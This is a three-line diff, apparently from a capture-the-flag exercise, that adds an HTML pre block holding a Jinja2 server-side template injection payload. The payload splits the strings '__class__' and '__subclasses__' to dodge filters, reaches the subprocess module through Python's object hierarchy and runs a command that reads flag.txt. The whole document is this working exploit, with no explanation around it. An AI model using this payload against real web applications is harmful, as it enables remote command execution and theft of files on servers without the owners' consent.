@@ -1,0 +1,3 @@
+<pre>
+{{request["__cl"+"a"+"ss__"].mro()[-1]['__subcla'+'sses__']()[84].load_module('subprocess').check_output(['cat','flag.txt'])}}
+</pre>
